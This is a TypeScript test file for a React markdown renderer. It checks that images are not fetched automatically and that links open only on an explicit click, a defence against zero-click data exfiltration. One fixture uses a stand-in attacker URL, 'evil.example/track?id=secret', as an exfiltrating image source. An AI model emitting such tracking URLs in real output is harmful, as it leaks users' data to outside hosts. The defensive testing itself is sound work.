// @vitest-environment happy-dom
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import { MarkdownImage, MarkdownLink } from "./safeMarkdown";

const openUrl = vi.fn();
vi.mock("@/lib/opener", () => ({
  openUrl: (url: string) => openUrl(url),
}));
vi.mock("react-i18next", () => ({
  useTranslation: () => ({ t: (k: string) => k }),
}));

describe("MarkdownImage — zero-click exfil 対策", () => {
  beforeEach(() => openUrl.mockReset());

  it("does NOT render an <img> (no network fetch on render)", () => {
    const { container } = render(
      <MarkdownImage src="https://evil.example/track?id=secret" alt="x" />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("button")).toBeTruthy();
  });

  it("opens the image URL only on explicit click", async () => {
    render(<MarkdownImage src="https://host/i.png" alt="pic" />);
    expect(openUrl).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole("button"));
    await waitFor(() =>
      expect(openUrl).toHaveBeenCalledWith("https://host/i.png"),
    );
  });
});

describe("MarkdownLink — リンクのゲート化", () => {
  beforeEach(() => openUrl.mockReset());

  it("renders a button instead of a navigating <a href>", () => {
    const { container } = render(
      <MarkdownLink href="https://site/page">label</MarkdownLink>,
    );
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText("label").closest("button")).toBeTruthy();
  });

  it("opens via openUrl on click", async () => {
    render(<MarkdownLink href="https://site/page">label</MarkdownLink>);
    fireEvent.click(screen.getByText("label"));
    await waitFor(() =>
      expect(openUrl).toHaveBeenCalledWith("https://site/page"),
    );
  });
});
